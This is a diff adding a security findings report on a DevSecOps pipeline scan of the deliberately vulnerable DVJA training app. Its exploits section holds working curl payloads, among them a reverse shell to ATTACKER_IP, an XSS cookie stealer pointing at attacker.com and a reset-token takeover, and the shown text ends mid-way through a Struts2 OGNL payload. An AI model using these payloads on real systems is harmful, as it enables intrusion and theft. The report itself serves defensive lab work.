@@ -1,0 +1,1016 @@
+# DVJA Security Findings Analysis
+
+**Date:** 2026-03-11
+**Application:** Damn Vulnerable Java Application (DVJA)
+**Pipeline:** DevSecOps CI/CD (CodeQL SAST + Trivy SCA + Trivy Container + Gitleaks)
+**Repository:** LaiKash/dvja
+
+---
+
+## Table of Contents
+
+1. [Executive Summary](#1-executive-summary)
+2. [Pipeline Coverage vs Solution Docs](#2-pipeline-coverage-vs-solution-docs)
+3. [SAST Findings — CodeQL (True/False Positive Analysis)](#3-sast-findings--codeql)
+4. [SCA Findings — Trivy Dependencies (True/False Positive Analysis)](#4-sca-findings--trivy-dependencies)
+5. [Container Scan Findings — Trivy Image (True/False Positive Analysis)](#5-container-scan-findings--trivy-image)
+6. [Vulnerabilities Missed by the Pipeline](#6-vulnerabilities-missed-by-the-pipeline)
+7. [Exploits](#7-exploits)
+8. [Recommendations](#8-recommendations)
+
+---
+
+## 1. Executive Summary
+
+The DevSecOps pipeline produced **49 GitHub issues** across four security tools: 4 SAST code findings (CodeQL), 20 SCA dependency findings (Trivy fs), and 25 container image findings (Trivy image). Gitleaks detected 0 secrets (see Appendix C for root cause analysis). The application's `docs/solution/` folder documents **10 OWASP Top 10 vulnerability categories** (A1–A10).
+
+| Metric | Count |
+|--------|-------|
+| Total pipeline issues | 49 |
+| CodeQL (SAST) issues | 4 |
+| Trivy SCA (dependencies) issues | 20 |
+| Trivy Container (image) issues | 25 |
+| Gitleaks (secrets) | 0 (see Appendix C.1) |
+| Solution docs | 10 (A1–A10) |
+| **True Positives** | **49 (100%)** |
+| **False Positives** | **0** |
+| Solution vulns detected by pipeline | 4 of 10 categories |
+| Solution vulns **missed** by pipeline | 6 of 10 categories |
+
+**Key finding:** All 49 issues are **true positives**. The container scan (after fixing `vuln-type` to `'os,library'`) found 25 additional issues that validate and expand the SCA findings by confirming vulnerable libraries exist in the deployed Docker image. However, the pipeline only detected **4 out of 10** documented vulnerability categories. Critical application-logic vulnerabilities (XSS, IDOR, CSRF, Broken Auth, Open Redirect, Access Control bypass) require DAST and were **not detected** by SAST/SCA tools.
+
+---
+
+## 2. Pipeline Coverage vs Solution Docs
+
+### 2.1 Mapping: Solutions ↔ Pipeline Issues
+
+| Solution | OWASP Category | Pipeline Detection | Issue # |
+|----------|---------------|-------------------|---------|
+| **A1** — SQL Injection | Injection | **DETECTED** (CodeQL) | #22 |
+| **A1** — Command Injection | Injection | **DETECTED** (CodeQL) | #21 |
+| **A2** — Broken Auth (weak reset token, MD5 passwords) | Broken Auth & Session Mgmt | **NOT DETECTED** | — |
+| **A3** — Reflected + Stored XSS | Cross-Site Scripting | **NOT DETECTED** | — |
+| **A4** — IDOR in EditUser | Insecure Direct Object Ref | **NOT DETECTED** | — |
+| **A5** — Security Misconfiguration (devMode=true) | Security Misconfiguration | **NOT DETECTED** | — |
+| **A6** — Sensitive data in logs | Sensitive Data Exposure | **DETECTED** (CodeQL) | #23 |
+| **A7** — Cookie-based admin bypass | Missing Function-Level Access | **NOT DETECTED** | — |
+| **A8** — CSRF on Add/Edit Product | Cross-Site Request Forgery | **NOT DETECTED** | — |
+| **A9** — Struts2 CVE-2017-5638 | Known Vulnerable Components | **DETECTED** (Trivy) | #6 |
+| **A10** — Open Redirect | Unvalidated Redirects | **NOT DETECTED** | — |
+
+### 2.2 Additional Findings (not in solution docs)
+
+| Issue # | Finding | Covered by Solutions? |
+|---------|---------|----------------------|
+| #24 | Log Injection (CWE-117) | No — related to A6 but distinct vulnerability |
+| #1–#5, #7–#20 | 19 dependency CVEs | Only A9 (Struts2) is explicitly documented |
+
+### 2.3 Analysis
+
+The pipeline **correctly identified** the most mechanically-detectable vulnerabilities:
+- **String-concatenated JPQL queries** → SQL Injection (#22 matches A1)
+- **Unsanitized `Runtime.exec()` input** → Command Injection (#21 matches A1)
+- **Password logged in cleartext** → Sensitive Data Exposure (#23 matches A6)
+- **Outdated Struts2 2.3.30** → Known Vulnerable Component (#6 matches A9)
+
+The pipeline **missed** vulnerabilities requiring semantic/business-logic understanding:
+- XSS (JSP `<%= %>` scriptlet and `escape="false"`)
+- IDOR (no authorization check on userId)
+- Broken authentication (MD5-based reset tokens)
+- CSRF (absence of anti-CSRF tokens)
+- Access control bypass (cookie-based admin check)
+- Open redirect (no URL validation)
+
+---
+
+## 3. SAST Findings — CodeQL
+
+### Issue #21: [CRITICAL][CODE] Uncontrolled command line — 1 location
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **CWE** | CWE-78 (OS Command Injection) |
+| **File** | `src/main/java/com/appsecco/dvja/controllers/PingAction.java` line 46 |
+| **Matches Solution** | A1 — Command Injection |
+| **Exploitable** | Yes — trivially exploitable |
+| **CVSS Estimate** | 9.8 (Critical) |
+
+**Vulnerable Code:**
+```java
+Runtime runtime = Runtime.getRuntime();
+String[] command = { "/bin/bash", "-c", "ping -t 5 -c 5 " + getAddress() };
+Process process = runtime.exec(command);
+```
+
+**Analysis:** User-supplied `address` parameter is concatenated directly into a shell command passed to `Runtime.exec()` via `/bin/bash -c`. The bash shell interprets metacharacters (`;`, `|`, `&&`, `` ` ``), enabling arbitrary command execution. This is a textbook OS command injection — high confidence true positive.
+
+---
+
+### Issue #22: [HIGH][CODE] Query built from user-controlled sources — 2 locations
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **CWE** | CWE-89 (SQL Injection) |
+| **Files** | `UserService.java:75`, `ProductService.java:48` |
+| **Matches Solution** | A1 — SQL Injection |
+| **Exploitable** | Yes — trivially exploitable |
+| **CVSS Estimate** | 9.8 (Critical) |
+
+**Vulnerable Code (UserService.java):**
+```java
+Query query = entityManager.createQuery(
+    "SELECT u FROM User u WHERE u.login = '" + login + "'");
+```
+
+**Vulnerable Code (ProductService.java):**
+```java
+Query query = entityManager.createQuery(
+    "SELECT p FROM Product p WHERE p.name LIKE '%" + name + "%'");
+```
+
+**Analysis:** Both locations use string concatenation to build JPQL queries with user-supplied input. No parameterized queries or input sanitization. The JPQL injection allows data extraction, authentication bypass, and potentially destructive operations. High confidence true positive.
+
+---
+
+### Issue #23: [HIGH][CODE] Insertion of sensitive information into log files — 1 location
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **CWE** | CWE-532 (Insertion of Sensitive Info into Log Files) |
+| **File** | `UserService.java:93` |
+| **Matches Solution** | A6 — Sensitive Data Exposure |
+| **Exploitable** | Yes — password readable in log files |
+| **CVSS Estimate** | 5.5 (Medium) |
+
+**Vulnerable Code:**
+```java
+logger.info("Changing password for login: " + login +
+    " New password: " + password);
+```
+
+**Analysis:** The plaintext password is written to application logs during password reset. Anyone with access to log files (operators, log aggregation systems, SIEM, backup tapes) can read user passwords. This directly matches the A6 solution documentation. True positive.
+
+---
+
+### Issue #24: [HIGH][CODE] Log Injection — 4 locations
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **CWE** | CWE-117 (Improper Output Neutralization for Logs) |
+| **Files** | `UserService.java:29,93,104`, `ProductService.java:28` |
+| **Matches Solution** | Not directly documented (related to A6) |
+| **Exploitable** | Yes — log forging/tampering |
+| **CVSS Estimate** | 5.3 (Medium) |
+
+**Analysis:** User-controlled values (`login`, `password`, product `name`) are written to log entries without sanitization. An attacker can inject newline characters (`%0A`, `%0D`) to forge fake log entries, potentially:
+- Covering tracks after an attack
+- Injecting misleading audit trails
+- Exploiting log viewers vulnerable to XSS (if HTML-based)
+
+This is a legitimate finding not covered in the solution docs. True positive.
+
+---
+
+## 4. SCA Findings — Trivy Dependencies
+
+### 4.1 CRITICAL Dependency Vulnerabilities
+
+#### Issue #6: org.apache.struts:struts2-core 2.3.30 — 17 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Matches Solution** | A9 — Using Components with Known Vulnerability |
+| **Exploitable** | Yes — multiple RCE vectors |
+| **Highest CVE** | CVE-2017-5638 (CVSS 10.0) |
+
+**Key CVEs and exploitability:**
+
+| CVE | Severity | Type | Exploitable in DVJA? |
+|-----|----------|------|---------------------|
+| CVE-2017-5638 | CRITICAL (10.0) | RCE via Content-Type OGNL injection | **Yes** — This is the Equifax breach vulnerability. Struts2 2.3.30 is in the affected range (<2.3.32). Trivially exploitable with a single HTTP request. |
+| CVE-2017-12611 | CRITICAL (9.8) | RCE via OGNL in Freemarker tags | **Yes** — if app uses Freemarker templates with user input |
+| CVE-2019-0230 | CRITICAL (9.8) | Forced double OGNL evaluation | **Yes** — affects 2.0.0 to 2.5.20 |
+| CVE-2020-17530 | CRITICAL (9.8) | Forced OGNL evaluation on raw input in tag attributes | **Yes** — affects up to 2.5.25 |
+| CVE-2021-31805 | CRITICAL (9.8) | Incomplete fix for CVE-2020-17530 | **Yes** — affects up to 2.5.29 |
+| CVE-2023-50164 | CRITICAL (9.8) | Path traversal in file upload | **Yes** — affects up to 2.5.32 |
+| CVE-2024-53677 | CRITICAL (9.8) | File upload manipulation | **Yes** — affects up to 6.3.x |
+| CVE-2018-11776 | HIGH (8.1) | RCE via namespace OGNL | **Yes** — affects 2.3 to 2.3.34 |
+
+All 17 CVEs are confirmed true positives. The pom.xml declares `struts2.version=2.3.30` which falls in the vulnerable range for all listed CVEs.
+
+---
+
+#### Issue #5: org.apache.logging.log4j:log4j-core 2.3 — 4 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Exploitable** | Yes — Log4Shell (CVE-2021-44228) is trivially exploitable |
+| **Highest CVE** | CVE-2021-44228 (CVSS 10.0) — Log4Shell |
+
+| CVE | Severity | Type | Exploitable in DVJA? |
+|-----|----------|------|---------------------|
+| CVE-2021-44228 | CRITICAL (10.0) | RCE via JNDI lookup (Log4Shell) | **Yes** — log4j-core 2.3 is in affected range. Any user input that gets logged (login names, search queries, User-Agent headers) can trigger JNDI resolution → RCE. |
+| CVE-2021-45046 | CRITICAL (9.0) | Incomplete fix for Log4Shell | **Yes** — same version |
+| CVE-2017-5645 | CRITICAL (9.8) | Deserialization via TCP/UDP socket | **Conditional** — exploitable only if SocketServer is enabled |
+| CVE-2021-45105 | HIGH (7.5) | DoS via infinite recursion in lookup | **Yes** — same version |
+
+**Note:** Log4Shell is one of the most critical vulnerabilities in recent history. DVJA uses log4j-core 2.3 and logs user-supplied data (login names, search queries), making it directly exploitable.
+
+---
+
+#### Issue #4: log4j:log4j 1.2.14 — 6 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Exploitable** | Conditional — depends on specific appender configuration |
+
+| CVE | Severity | Exploitable in DVJA? |
+|-----|----------|---------------------|
+| CVE-2019-17571 | CRITICAL (9.8) | **Conditional** — requires SocketServer class to be enabled |
+| CVE-2022-23305 | CRITICAL (9.8) | **Conditional** — requires JDBCAppender configuration |
+| CVE-2022-23307 | CRITICAL (8.8) | **Conditional** — requires Chainsaw component |
+| CVE-2021-4104 | HIGH (7.5) | **Conditional** — requires JMSAppender configuration |
+| CVE-2022-23302 | HIGH (8.8) | **Conditional** — requires JMSSink configuration |
+| CVE-2023-26464 | HIGH (7.5) | **Conditional** — requires Chainsaw/SocketAppender |
+
+True positive in terms of the vulnerable library being present. Actual exploitability depends on which log4j 1.x appenders are configured. The library is a transitive dependency via `slf4j-log4j12`.
+
+---
+
+#### Issue #1: commons-collections:commons-collections 3.1 — 2 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Highest CVE** | CVE-2015-7501 (CVSS 9.8) |
+| **Exploitable** | **Yes** — Java deserialization RCE via InvokerTransformer |
+
+Commons Collections 3.1 contains the infamous `InvokerTransformer` gadget chain used in Java deserialization attacks. If the application deserializes untrusted data (e.g., via RMI, JMX, or custom endpoints), this enables RCE. The `ysoserial` tool has a ready-made payload (`CommonsCollections1`).
+
+---
+
+#### Issue #2: commons-fileupload:commons-fileupload 1.3.2 — 3 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Highest CVE** | CVE-2016-1000031 (CVSS 9.8) |
+| **Exploitable** | **Yes** — RCE via DiskFileItem deserialization |
+
+Struts2 uses commons-fileupload for multipart request handling. CVE-2016-1000031 allows RCE through the `DiskFileItem` class during deserialization.
+
+---
+
+#### Issue #3: dom4j:dom4j 1.6.1 — 2 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Highest CVE** | CVE-2020-10683 (CVSS 9.8) |
+| **Exploitable** | **Conditional** — requires the application to parse untrusted XML input via dom4j |
+
+dom4j 1.6.1 is a transitive dependency via Hibernate. XXE exploitation requires the app to process XML input with dom4j's SAXReader. DVJA primarily uses JPA/Hibernate for data access, so direct exploitation through user-facing endpoints is unlikely without additional attack vectors (e.g., via Hibernate XML mapping manipulation). Lower practical risk despite high CVSS.
+
+---
+
+#### Issue #7: org.springframework:spring-beans 3.0.5.RELEASE — 2 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Highest CVE** | CVE-2022-22965 — Spring4Shell (CVSS 9.8) |
+| **Exploitable** | **No** — Spring4Shell requires JDK 9+; DVJA uses JDK 8 |
+
+**Important nuance:** While CVE-2022-22965 (Spring4Shell) is a critical RCE, it specifically requires **JDK 9 or higher** plus deployment on Tomcat as a WAR. DVJA is compiled with Java 7 source compatibility (`<source>1.7</source>` in pom.xml) and uses JDK 8. This makes Spring4Shell **not exploitable** in this specific context, though the vulnerability is real and the dependency should still be updated.
+
+---
+
+#### Issue #8: org.springframework:spring-web 3.0.5.RELEASE — 4 vulnerabilities
+
+| Field | Value |
+|-------|-------|
+| **Verdict** | **TRUE POSITIVE** |
+| **Highest CVE** | CVE-2016-1000027 (CVSS 9.8) |
+| **Exploitable** | **Conditional** |
+
+CVE-2016-1000027 relates to unsafe deserialization in Spring's `HttpInvokerServiceExporter`. Exploitable only if the application exposes HTTP invoker endpoints (DVJA does not appear to). The URL parsing CVEs (CVE-2024-22243/22259/22262) are exploitable if the application uses `UriComponentsBuilder` with user input — not the case in DVJA.
+
+---
+
+### 4.2 HIGH Dependency Vulnerabilities
+
+| Issue # | Package | Version | CVEs | Verdict | Exploitable in DVJA? |
+|---------|---------|---------|------|---------|---------------------|
+| #9 | gson | 2.8.1 | CVE-2022-25647 | TRUE POSITIVE | **Conditional** — requires deserialization of untrusted JSON. DVJA uses Gson for serialization (output), reducing risk. |
+| #10 | commons-beanutils | 1.7.0 | CVE-2019-10086, CVE-2025-48734 | TRUE POSITIVE | **Yes** — `PropertyUtils` access bypass enables code execution when combined with Struts2 parameter injection. |
+| #11 | commons-io | 2.2 | CVE-2024-47554 | TRUE POSITIVE | **Low** — DoS via resource consumption. Not direct RCE. |
+| #12 | mysql-connector-java | 5.1.42 | CVE-2018-3258, CVE-2023-22102 | TRUE POSITIVE | **Conditional** — requires MITM or control over JDBC connection string. |
+| #13 | xwork-core | 2.3.30 | CVE-2025-68493 | TRUE POSITIVE | **Yes** — Missing XML validation in Struts/XWork configuration. |
+| #14 | struts-core (1.x) | 1.3.8 | 4 CVEs | TRUE POSITIVE | **Low** — Struts 1 is a separate dependency. Unless Struts 1 servlet is mapped, exposure is limited. |
+| #15 | struts-tiles | 1.3.8 | CVE-2023-49735 | TRUE POSITIVE | **Conditional** — locale-based vulnerability in Tiles. |
+| #16 | velocity | 1.6.2 | CVE-2020-13936 | TRUE POSITIVE | **Conditional** — exploitable only if users can modify Velocity templates. |
+| #17 | hibernate-core | 3.3.1.GA | CVE-2020-25638 | TRUE POSITIVE | **Yes** — SQL injection via Hibernate when `hibernate.use_sql_comments=true` (configured in DVJA). |
+| #18 | spring-context | 3.0.5 | CVE-2022-22968 | TRUE POSITIVE | **Low** — disallowedFields bypass. Requires specific data binding patterns. |
+| #19 | spring-core | 3.0.5 | 4 CVEs | TRUE POSITIVE | **Yes** — CVE-2011-2730 (EL injection) is directly relevant to JSP applications. |
+| #20 | spring-expression | 3.0.5 | CVE-2023-20863 | TRUE POSITIVE | **Conditional** — DoS via SpEL expression. |
+
+---
+
+## 5. Container Scan Findings — Trivy Image
+
+After fixing the Trivy container scan to include library-level vulnerabilities (`vuln-type: 'os,library'`), the scan detected **25 vulnerable packages** inside the Docker image. These findings validate and expand the SCA results by confirming the vulnerable libraries exist in the **deployed artifact**, not just in the `pom.xml` declaration.
+
+### 5.1 Why Container Scan Matters (Defense in Depth)
+
+The SCA scan (Trivy fs) analyzes `pom.xml` — what the build *declares*. The container scan (Trivy image) analyzes the Docker image layers — what is *actually deployed*. This catches:
+- Libraries introduced outside Maven (e.g., JARs copied into the image manually)
+- Transitive dependencies pulled in by the build system but not declared in `pom.xml`
+- OS-level packages from the base image (e.g., Ubuntu libraries)
+- Version discrepancies between declared and actual deployed versions
+
+### 5.2 CRITICAL Container Findings (Issues #25–36)
+
+| Issue # | Package | Version | CVE Count | Verdict | Key CVEs |
+|---------|---------|---------|-----------|---------|----------|
+| #33 | struts2-core | 2.3.30 | 51 | TRUE POSITIVE | CVE-2017-5638 (10.0), CVE-2023-50164 (9.8), CVE-2024-53677 (9.8) |
+| #30 | log4j-core | 2.3 | 12 | TRUE POSITIVE | CVE-2021-44228 Log4Shell (10.0), CVE-2021-45046 (9.0) |
+| #29 | log4j 1.x | 1.2.14 | 24 | TRUE POSITIVE | CVE-2019-17571 (9.8), CVE-2022-23305 (9.8) |
+| #25 | xstream | 1.4.10 | 23 | TRUE POSITIVE | CVE-2021-39144 (8.5), CVE-2021-21344 (9.8) — deserialization RCE |
+| #26 | commons-collections | 3.1 | 8 | TRUE POSITIVE | CVE-2015-7501 (9.8) — InvokerTransformer gadget chain |
+| #27 | commons-fileupload | 1.3.2 | 9 | TRUE POSITIVE | CVE-2016-1000031 (9.8) — DiskFileItem deserialization |
+| #28 | dom4j | 1.6.1 | 6 | TRUE POSITIVE | CVE-2020-10683 (9.8) — XXE injection |
+| #34 | plexus-utils | 3.0.15 | 14 | TRUE POSITIVE | CVE-2022-4244 (9.1) — path traversal, only in build tooling |
+| #35 | spring-beans | 3.0.5 | 6 | TRUE POSITIVE | CVE-2022-22965 Spring4Shell (9.8) — not exploitable on JDK 8 |
+| #36 | spring-web | 3.0.5 | 12 | TRUE POSITIVE | CVE-2016-1000027 (9.8) — unsafe deserialization |
+| #32 | maven-core | 3.0.4 | 3 | TRUE POSITIVE | Build tooling CVEs |
+| #31 | maven-shared-utils | 0.1 | 1 | TRUE POSITIVE | CVE-2022-29599 (9.8) — command injection in build utils |
+
+**Notable new finding:** XStream 1.4.10 (#25) with **23 vulnerabilities** was not reported by the SCA scan because it's a transitive dependency pulled in during the build, not directly declared in `pom.xml`. This demonstrates the value of container scanning as a second layer of defense.
+
+### 5.3 HIGH Container Findings (Issues #37–49)
+
+| Issue # | Package | Version | CVE Count | Verdict | Notes |
+|---------|---------|---------|-----------|---------|-------|
+| #42 | struts-core (1.x) | 1.3.8 | 12 | TRUE POSITIVE | Legacy Struts 1 — ClassLoader manipulation, OGNL injection |
+| #41 | xwork-core | 2.3.30 | 3 | TRUE POSITIVE | Struts2 internal — XML validation bypass |
+| #40 | mysql-connector-java | 5.1.42 | 6 | TRUE POSITIVE | MITM and deserialization vectors |
+| #48 | spring-core | 3.0.5 | 12 | TRUE POSITIVE | Multiple RCE and DoS vectors |
+| #38 | commons-beanutils | 1.7.0 | 6 | TRUE POSITIVE | Property access bypass chain |
+| #39 | commons-io | 2.2 | 4 | TRUE POSITIVE | Path traversal and DoS |
+| #37 | gson | 2.8.1 | 3 | TRUE POSITIVE | Deserialization DoS |
+| #43 | struts-tiles | 1.3.8 | 3 | TRUE POSITIVE | Locale-based path traversal |
+| #44 | velocity | 1.6.2 | 3 | TRUE POSITIVE | Template sandbox escape |
+| #45 | plexus-archiver | 2.1 | 2 | TRUE POSITIVE | Archive extraction path traversal (build tooling) |
+| #46 | hibernate-core | 3.3.1.GA | 3 | TRUE POSITIVE | SQL injection via comments |
+| #47 | spring-context | 3.0.5 | 3 | TRUE POSITIVE | DisallowedFields bypass |
+| #49 | spring-expression | 3.0.5 | 3 | TRUE POSITIVE | SpEL DoS |
+
+### 5.4 Container vs SCA: Comparison
+
+The container scan found **higher CVE counts** per library than the SCA scan because:
+- **Trivy fs** (SCA) only reports CVEs matching the exact version declared in `pom.xml`
+- **Trivy image** scans the actual JAR files inside the WAR, including transitive dependencies and their sub-dependencies, often finding additional CVEs at lower levels
+
+| Library | SCA (pom.xml) CVEs | Container (image) CVEs | Delta |
+|---------|-------------------|----------------------|-------|
+| struts2-core | 17 | 51 | +34 |
+| log4j-core | 4 | 12 | +8 |
+| log4j 1.x | 6 | 24 | +18 |
+| spring-web | 4 | 12 | +8 |
+| xstream | 0 (not in SCA) | 23 | **+23 (new)** |
+| plexus-utils | 0 (not in SCA) | 14 | **+14 (new)** |
+
+---
+
+## 6. Vulnerabilities Missed by the Pipeline
+
+These documented vulnerabilities from the solution folder were **not detected** by CodeQL or Trivy:
+
+### 6.1 A3 — Cross-Site Scripting (XSS)
+
+**Reflected XSS in `ProductList.jsp`:**
+```jsp
+<%= request.getParameter("searchQuery") %>
+```
+
+**Stored XSS in `ProductList.jsp`:**
+```jsp
+<s:property value="name" escape="false"/>
+```
+
+**Why missed:** CodeQL's Java analysis may not fully trace data flow through JSP scriptlets and Struts2 tag libraries. The `escape="false"` pattern requires understanding Struts2 semantics.
+
+**Exploitable:** Yes (see Exploit #3 and #4 below).
+
+---
+
+### 6.2 A2 — Broken Authentication and Session Management
+
+**Predictable password reset token:**
+```java
+if(!StringUtils.equalsIgnoreCase(
+    DigestUtils.md5DigestAsHex(login.getBytes()), key))
+    return false;
+```
+
+**Weak password hashing:**
+```java
+private String hashEncodePassword(String password) {
+    return DigestUtils.md5DigestAsHex(password.getBytes());
+}
+```
+
+**Why missed:** CodeQL's `java/weak-cryptographic-algorithm` query exists but may not have flagged MD5 in this context because it's used for hashing rather than encryption. The predictable token pattern is an application-logic flaw that static analysis typically cannot detect.
+
+**Exploitable:** Yes (see Exploit #5 below).
+
+---
+
+### 6.3 A4 — Insecure Direct Object Reference (IDOR)
+
+**No authorization check on `editUser`:**
+```java
+user = userService.find(getUserId());
+user.setPassword(getPassword());
+user.setId(getUserId());
+userService.save(user);
+```
+
+**Why missed:** IDOR is an authorization logic flaw. Static analysis cannot determine that `userId` should be restricted to the authenticated user's own ID.
+
+**Exploitable:** Yes (see Exploit #6 below).
+
+---
+
+### 6.4 A5 — Security Misconfiguration
+
+**Struts2 devMode enabled:**
+```xml
+<constant name="struts.devMode" value="true"/>
+```
+
+**Why missed:** Configuration analysis is outside typical SAST scope. A dedicated configuration scanner or custom CodeQL query would be needed.
+
+---
+
+### 6.5 A7 — Missing Function Level Access Control
+
+**Cookie-based admin check:**
+```java
+for(Cookie c: getServletRequest().getCookies()) {
+    if(c.getName().equals("admin") && c.getValue().equals("1")) {
+        isAdmin = true;
+```
+
+**Why missed:** The code is syntactically valid — the flaw is that a client-controlled cookie is used as an authorization mechanism. This requires semantic understanding of security design.
+
+**Exploitable:** Yes (see Exploit #7 below).
+
+---
+
+### 6.6 A8 — Cross-Site Request Forgery (CSRF)
+
+**No anti-CSRF tokens on state-changing forms.**
+
+**Why missed:** CSRF detection requires understanding of HTTP method semantics and the absence of token validation. CodeQL has limited CSRF detection for Struts2 applications.
+
+---
+
+### 6.7 A10 — Unvalidated Redirects and Forwards
+
+**Open redirect in `RedirectAction.java`:**
+```java
+public String execute() {
+    if(!StringUtils.isEmpty(getUrl()))
+        return "redirect";
+    return renderText("Missing url");
+}
+```
+
+**Why missed:** CodeQL has `java/unvalidated-url-redirection` queries, but this Struts2 redirect pattern (via `struts.xml` result type) may not be recognized. The data flows through Struts2 configuration (`${url}` in result) rather than through standard servlet redirect APIs.
+
+---
+
+## 7. Exploits
+
+> **WARNING:** These exploits are provided for authorized security testing only. Ensure you have proper authorization before executing any of these against a live system.
+
+### Exploit #1: SQL Injection — Authentication Bypass (matches Issue #22, Solution A1)
+
+**Target:** `http://dvja:8080/userSearch.action`
+**CWE:** CWE-89
+
+```bash
+# Extract all users via JPQL injection
+curl "http://dvja:8080/userSearch.action" \
+  --data-urlencode "login=' OR '1'='1"
+
+# Error-based injection to confirm vulnerability
+curl "http://dvja:8080/userSearch.action" \
+  --data-urlencode "login='"
+```
+
+**Expected result:** The first request returns all users from the database. The second triggers a SQL error message, confirming the injection point.
+
+---
+
+### Exploit #2: OS Command Injection — Remote Code Execution (matches Issue #21, Solution A1)
+
+**Target:** `http://dvja:8080/ping.action`
+**CWE:** CWE-78
+
+```bash
+# Execute arbitrary commands via command chaining
+curl "http://dvja:8080/ping.action" \
+  --data-urlencode "address=127.0.0.1; id"
+
+# Read sensitive files
+curl "http://dvja:8080/ping.action" \
+  --data-urlencode "address=127.0.0.1; cat /etc/passwd"
+
+# Reverse shell (for authorized pentests only)
+curl "http://dvja:8080/ping.action" \
+  --data-urlencode "address=127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+```
+
+**Expected result:** The `id` output or file contents appear in the ping command output area. The bash shell interprets the `;` as a command separator.
+
+---
+
+### Exploit #3: Reflected XSS (Solution A3, missed by pipeline)
+
+**Target:** `http://dvja:8080/listProduct.action`
+**CWE:** CWE-79
+
+```
+http://dvja:8080/listProduct.action?searchQuery=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
+
+**URL-encoded version:**
+```bash
+curl "http://dvja:8080/listProduct.action?searchQuery=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E"
+```
+
+**Expected result:** The script tag is rendered directly in the HTML response because `ProductList.jsp` uses `<%= request.getParameter("searchQuery") %>` without encoding. When a victim clicks the link, their cookies are exfiltrated.
+
+---
+
+### Exploit #4: Stored XSS via Product Name (Solution A3, missed by pipeline)
+
+**Target:** `http://dvja:8080/addEditProduct.action`
+**CWE:** CWE-79
+
+```bash
+# Step 1: Create a product with malicious name (requires authentication)
+curl "http://dvja:8080/addEditProduct.action" \
+  -X POST \
+  -H "Cookie: JSESSIONID=<valid_session>" \
+  -d "product.name=<script>alert('Stored XSS')</script>&product.description=test&product.code=XSS01&product.tags=test"
+
+# Step 2: Any user viewing the product list will trigger the XSS
+# Visit: http://dvja:8080/listProduct.action
+```
+
+**Expected result:** The product name is stored in the database. When rendered in `ProductList.jsp` with `escape="false"`, the script executes in every visitor's browser.
+
+---
+
+### Exploit #5: Broken Authentication — Password Reset Takeover (Solution A2, missed by pipeline)
+
+**Target:** `http://dvja:8080/resetPasswordExecute.action`
+**CWE:** CWE-640
+
+```bash
+# The reset key is MD5(login). For user "admin":
+# MD5("admin") = 21232f297a57a5a743894a0e4a801fc3
+
+curl "http://dvja:8080/resetPasswordExecute.action" \
+  -d "login=admin&key=21232f297a57a5a743894a0e4a801fc3&password=hacked&passwordConfirmation=hacked"
+
+# For any user, compute the key:
+# echo -n "john.doe" | md5sum
+# → 6c34fc34f51ce4ab1db1e3a0ee42c2b0
+
+curl "http://dvja:8080/resetPasswordExecute.action" \
+  -d "login=john.doe&key=6c34fc34f51ce4ab1db1e3a0ee42c2b0&password=hacked&passwordConfirmation=hacked"
+```
+
+**Expected result:** The password for the specified user is changed to "hacked". The attacker can now log in as any user by computing MD5 of their username.
+
+---
+
+### Exploit #6: IDOR — Edit Any User's Account (Solution A4, missed by pipeline)
+
+**Target:** `http://dvja:8080/editUser.action`
+**CWE:** CWE-639
+
+```bash
+# Change another user's password and email (no authorization check)
+# userId=1 targets the first user (likely admin)
+curl "http://dvja:8080/editUser.action" \
+  -X POST \
+  -H "Cookie: JSESSIONID=<valid_session>" \
+  -d "userId=1&email=attacker@evil.com&password=pwned&passwordConfirmation=pwned"
+
+# Enumerate user IDs
+for i in $(seq 1 20); do
+  curl -s "http://dvja:8080/editUser.action" \
+    -X POST \
+    -H "Cookie: JSESSIONID=<valid_session>" \
+    -d "userId=$i&email=test@test.com&password=test&passwordConfirmation=test" \
+    -o /dev/null -w "userId=$i status=%{http_code}\n"
+done
+```
+
+**Expected result:** The password and email for the targeted userId are changed, regardless of whether the authenticated user owns that account.
+
+---
+
+### Exploit #7: Admin API Bypass via Cookie (Solution A7, missed by pipeline)
+
+**Target:** `http://dvja:8080/api/userList`
+**CWE:** CWE-285
+
+```bash
+# No authentication needed — just set the admin cookie
+curl -H "Cookie: admin=1" "http://dvja:8080/api/userList"
+
+# Expected output:
+# {"users":[{"id":"1","email":"admin@dvja.local","login":"admin","role":"admin"},...], "count":N}
+```
+
+**Expected result:** Full user listing including IDs, emails, logins, and roles returned without any real authentication.
+
+---
+
+### Exploit #8: Open Redirect (Solution A10, missed by pipeline)
+
+**Target:** `http://dvja:8080/redirect.action`
+**CWE:** CWE-601
+
+```bash
+# Redirect to phishing site
+http://dvja:8080/redirect.action?url=http://evil-phishing-site.com/login
+
+# Redirect to attacker-controlled credential harvester
+http://dvja:8080/redirect.action?url=http://attacker.com/fake-dvja-login.html
+```
+
+**Expected result:** The user is redirected to the external URL. This can be used in phishing attacks where the victim trusts the `dvja` domain.
+
+---
+
+### Exploit #9: Struts2 RCE — CVE-2017-5638 (matches Issue #6, Solution A9)
+
+**Target:** Any DVJA URL
+**CWE:** CWE-94 (Code Injection)
+
+```bash
+# Execute 'id' command via Content-Type OGNL injection
+curl -H "Content-Type: %{(#_='multipart/form-data').\
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
